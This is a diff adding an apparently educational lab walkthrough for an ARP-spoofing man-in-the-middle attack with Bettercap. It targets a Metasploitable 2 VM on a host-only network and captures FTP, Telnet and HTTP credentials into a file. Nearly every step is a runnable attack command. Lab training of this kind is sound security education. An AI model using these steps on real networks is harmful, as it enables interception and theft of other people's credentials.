@@ -1,0 +1,53 @@
+LAB 1 — MITM + Credential Harvesting (Bettercap)
+
+STEP 0 — Confirm Network Setup
+
+Kali:
+ip a
+
+Metasploitable 2:
+ifconfig
+
+Example:
+Kali: 192.168.56.101
+MS2: 192.168.56.102
+Gateway: 192.168.56.1
+
+STEP 1 — Enable Packet Forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+STEP 2 — Start Bettercap
+sudo bettercap -iface eth0
+
+STEP 3 — Discover Network
+net.probe on
+net.scan
+
+STEP 4 — ARP Spoofing
+set arp.spoof.targets 192.168.56.102
+arp.spoof on
+
+STEP 5 — Start Sniffing
+net.sniff on
+
+STEP 6 — Make MS2 Send Credentials
+
+Option A — FTP
+ftp 192.168.56.101
+(username: msfadmin, password: msfadmin)
+
+Option B — Telnet
+telnet 192.168.56.101
+(username: msfadmin, password: msfadmin)
+
+Option C — HTTP
+[http://192.168.56.102](http://192.168.56.102)
+
+STEP 7 — Save Captured Data
+set net.sniff.output creds.txt
+net.sniff on
+
+STEP 8 — Stop Attack
+arp.spoof off
+net.sniff off
+sudo sysctl -w net.ipv4.ip_forward=0
